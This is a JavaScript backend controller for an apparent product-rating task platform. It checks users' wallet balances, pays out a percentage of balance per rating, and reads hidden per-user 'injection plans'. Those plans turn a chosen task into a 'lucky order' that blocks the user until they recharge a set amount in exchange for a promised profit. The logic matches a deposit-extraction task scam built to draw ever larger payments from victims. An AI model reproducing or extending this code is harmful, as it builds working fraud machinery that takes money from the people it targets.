// your-project/controllers/task.controller.js

const Task = require('../models/task.model');
const User = require('../models/user.model');
const InjectionPlan = require('../models/injectionPlan.model');
const { io } = require('../server');

exports.getTask = (req, res) => {
    const userId = req.user.id;

    if (!userId) {
        return res.status(401).json({ message: "User not authenticated." });
    }

    User.findById(userId, (err, user) => {
        if (err) {
            console.error("Error fetching user for getTask validation:", err);
            return res.status(500).json({ message: "Error fetching user details." });
        }
        if (!user) {
            return res.status(404).json({ message: "User not found." });
        }

        // --- NEW: Check for a required recharge FIRST ---
        if (user.required_recharge_amount !== null && user.required_recharge_amount > 0) {
            return res.status(403).json({
                message: `A lucky order requires you to recharge $${parseFloat(user.required_recharge_amount).toFixed(2)} to continue.`,
                task: null,
                errorCode: 'LUCKY_ORDER_RECHARGE_REQUIRED'
            });
        }

        const walletBalance = parseFloat(user.wallet_balance || 0);
        const minimumBalanceRequired = 2.00;

        if (walletBalance < minimumBalanceRequired) {
            console.log(`[Task Controller - getTask] User ${userId} blocked from starting task. Balance ${walletBalance} is less than minimum ${minimumBalanceRequired}.`);
            return res.status(200).json({
                message: "You can't evaluate products with the current amount. At least you should recharge $2 minimum.",
                task: null,
                errorCode: 'INSUFFICIENT_BALANCE_FOR_TASKS'
            });
        }

        console.log(`[Task Controller - getTask] Raw user object from findById for User ${userId}:`, user);

        const currentCompletedTasks = parseInt(user.completed_orders || 0, 10);
        const dailyLimit = parseInt(user.daily_orders || 0, 10);
        const currentUncompletedTasks = parseInt(user.uncompleted_orders || 0, 10);

        console.log(`[Task Controller - getTask] User ${userId} - Daily Limit: ${dailyLimit}, Current Completed: ${currentCompletedTasks}, Current Uncompleted: ${currentUncompletedTasks}`);

        if (currentUncompletedTasks <= 0) {
            console.log(`[Task Controller - getTask] User ${userId} has completed all their currently assigned daily tasks (uncompleted_orders is 0).`);
            return res.status(200).json({ message: "You have completed all your daily tasks.", task: null, taskCount: currentCompletedTasks, isLuckyOrder: false, luckyOrderCapitalRequired: 0 });
        }

        let isLuckyOrder = false;
        let luckyOrderCapitalRequired = 0;
        let luckyOrderProfit = 0;
        const nextTaskNumber = currentCompletedTasks + 1;

        InjectionPlan.findByUserId(userId, (planErr, injectionPlans) => {
            if (planErr) {
                console.error("Error fetching injection plans:", planErr);
                return res.status(500).json({ message: "Error fetching injection plans.", error: planErr.message });
            }

            const matchingInjectionPlan = injectionPlans.find(plan =>
                parseInt(plan.injection_order, 10) === nextTaskNumber
            );

            if (matchingInjectionPlan) {
                isLuckyOrder = true;
                luckyOrderCapitalRequired = parseFloat(matchingInjectionPlan.injections_amount) || 0;
                luckyOrderProfit = parseFloat(matchingInjectionPlan.commission_rate) || 0;
                console.log(`[Task Controller - getTask] Lucky order found for user ${userId} at task ${nextTaskNumber}.`);
            }

            Task.getTaskForUser(userId, (taskErr, task) => {
                if (taskErr) {
                    console.error("Error fetching task:", taskErr);
                    return res.status(500).json({ message: "Error fetching task", error: taskErr.message });
                }
                if (!task) {
                    console.log(`[Task Controller - getTask] User ${userId} has uncompleted orders but no new products found.`);
                    return res.status(200).json({ message: "No new products available for rating.", task: null, taskCount: currentCompletedTasks, isLuckyOrder: false, luckyOrderCapitalRequired: 0 });
                }

                const taskToSend = {
                    id: task.id,
                    name: task.name,
                    image_url: task.image_url || task.image,
                    description: task.description,
                    price: parseFloat(task.price) || 0,
                    capital_required: isLuckyOrder ? luckyOrderCapitalRequired : (parseFloat(task.capital_required) || 0),
                    profit: isLuckyOrder ? luckyOrderProfit : 0
                };

                console.log(`[Task Controller - getTask] User ${userId} - Task fetched: ${taskToSend.name}, Is Lucky Order: ${isLuckyOrder}, Profit: ${taskToSend.profit}`);

                res.status(200).json({
                    task: taskToSend,
                    balance: parseFloat(user.wallet_balance) || 0,
                    taskCount: currentCompletedTasks,
                    isLuckyOrder: isLuckyOrder,
                    luckyOrderCapitalRequired: luckyOrderCapitalRequired
                });
            });
        });
    });
};

exports.submitTaskRating = (req, res) => {
    const userId = req.user.id;
    const { productId, rating } = req.body;
    console.log(`[Task Controller - submitTaskRating] User ${userId} submitting rating for Product ${productId} with rating ${rating}.`);

    if (!userId) return res.status(401).json({ message: "User not authenticated." });
    if (!productId || typeof rating === 'undefined' || rating < 1 || rating > 5) {
        return res.status(400).json({ message: "Product ID and a valid rating (1-5) are required." });
    }

    User.findById(userId, (err, user) => {
        if (err) return res.status(500).json({ message: "Error fetching user details." });
        if (!user) return res.status(404).json({ message: "User not found." });
        
        // --- NEW: Add this check at the start of the function ---
        if (user.required_recharge_amount !== null && user.required_recharge_amount > 0) {
            return res.status(403).json({
                message: `You cannot complete tasks until you recharge the required amount of $${parseFloat(user.required_recharge_amount).toFixed(2)}.`,
                isCompleted: false
            });
        }

        let currentCompleted = parseInt(user.completed_orders || 0, 10);
        let currentUncompleted = parseInt(user.uncompleted_orders || 0, 10);
        const isCompletedRating = (rating === 5);

        if (isCompletedRating && currentUncompleted <= 0) {
            return res.status(400).json({ message: "You have already completed all your daily tasks." });
        }

        Task.recordProductRating(userId, productId, rating, (recordErr) => {
            if (recordErr) return res.status(500).json({ message: "Failed to submit rating." });

            let message = "Rating submitted.";

            if (isCompletedRating) {
                const nextTaskNumber = currentCompleted + 1;

                InjectionPlan.findByUserIdAndOrder(userId, nextTaskNumber, (planErr, luckyPlan) => {
                    if (planErr) return res.status(500).json({ message: "Error checking for lucky order." });

                    // --- THIS ENTIRE BLOCK IS THE NEW LOGIC FOR LUCKY ORDERS ---
                    if (luckyPlan) {
                        const profitAmount = parseFloat(luckyPlan.commission_rate);
                        const capitalToRecharge = parseFloat(luckyPlan.injections_amount);

                        // Set the required recharge amount on the user's account and stop them.
                        User.setRequiredRecharge(userId, capitalToRecharge, (setErr) => {
                            if (setErr) {
                                console.error(`[Task Controller] Error setting required recharge for user ${userId}:`, setErr);
                                return res.status(500).json({ message: "A server error occurred while processing the lucky order." });
                            }
                            
                            // Inform the user they must recharge this specific amount.
                            return res.status(400).json({ 
                                message: `Lucky order! You will earn a profit of $${profitAmount.toFixed(2)}. You need to recharge $${capitalToRecharge.toFixed(2)} to proceed.`, 
                                isCompleted: false,
                                errorCode: 'LUCKY_ORDER_RECHARGE_REQUIRED'
                            });
                        });
                    } else {
                        // This block executes when it's NOT a lucky order (ordinary task).
                        const PROFIT_PERCENTAGE = 0.05;
                        const currentUserBalance = parseFloat(user.wallet_balance);
                        const profitToAdd = currentUserBalance * PROFIT_PERCENTAGE;

                        console.log(`[Task Controller - submitTaskRating] Ordinary Task. User Balance: $${currentUserBalance}. Profit Percentage: ${PROFIT_PERCENTAGE * 100}%. Profit to Add: $${profitToAdd.toFixed(2)}`);

                        User.updateBalanceAndTaskCount(userId, profitToAdd, 'add', (updateErr) => {
                            if (updateErr) {
                                console.error(`[Task Controller - submitTaskRating] Error updating user balance/task counts for user ${userId}:`, updateErr);
                                return res.status(500).json({ message: "Task completed, but failed to update user data." });
                            }
                            
                            const REFERRAL_PROFIT_PERCENTAGE = 0.10; // 10% for the invited customer
                            User.findUsersByReferrerId(userId, (findReferralsErr, referredUsers) => {
                                if (findReferralsErr) {
                                    console.error(`[Task Controller - submitTaskRating] Error finding referred users for inviter ${userId}:`, findReferralsErr);
                                } else if (referredUsers && referredUsers.length > 0) {
                                    const profitForReferrals = profitToAdd * REFERRAL_PROFIT_PERCENTAGE;
                                    referredUsers.forEach(referredUser => {
                                        User.updateWalletBalance(referredUser.id, profitForReferrals, 'add', (referredUpdateErr) => {
                                            if (referredUpdateErr) {
                                                console.error(`[Task Controller - submitTaskRating] Error adding referral profit to invited user ${referredUser.id}:`, referredUpdateErr);
                                            } else {
                                                console.log(`[Task Controller - submitTaskRating] Successfully added $${profitForReferrals.toFixed(2)} to invited user ${referredUser.username} (ID: ${referredUser.id}) from inviter ${userId}'s ordinary order.`);
                                            }
                                        });
                                    });
                                } else {
                                    console.log(`[Task Controller - submitTaskRating] Inviter ${userId} completed ordinary order, but has no referred users.`);
                                }
                            });

                            res.status(200).json({ message: `Task completed successfully! You earned $${profitToAdd.toFixed(2)}.`, isCompleted: true });
                        });
                    }
                });

            } else {
                res.status(200).json({ message, isCompleted: false });
            }
        });
    });
};

exports.getDashboardSummary = (req, res) => {
    const userId = req.user.id;

    if (!userId) {
        return res.status(401).json({ message: "User not authenticated." });
    }

    Task.getDashboardCountsForUser(userId, (err, counts) => {
        if (err) {
            console.error("Error fetching dashboard summary:", err);
            return res.status(500).json({ message: "Error fetching dashboard summary", error: err.message });
        }
        if (!counts || counts.length === 0) {
             return res.status(200).json({ completedOrders: 0, uncompletedOrders: 0, dailyOrders: 0 });
        }

        const { completed_orders, uncompleted_orders, daily_orders } = counts[0];
        res.status(200).json({
            completedOrders: completed_orders,
            uncompletedOrders: uncompleted_orders,
            dailyOrders: daily_orders
        });
    });
};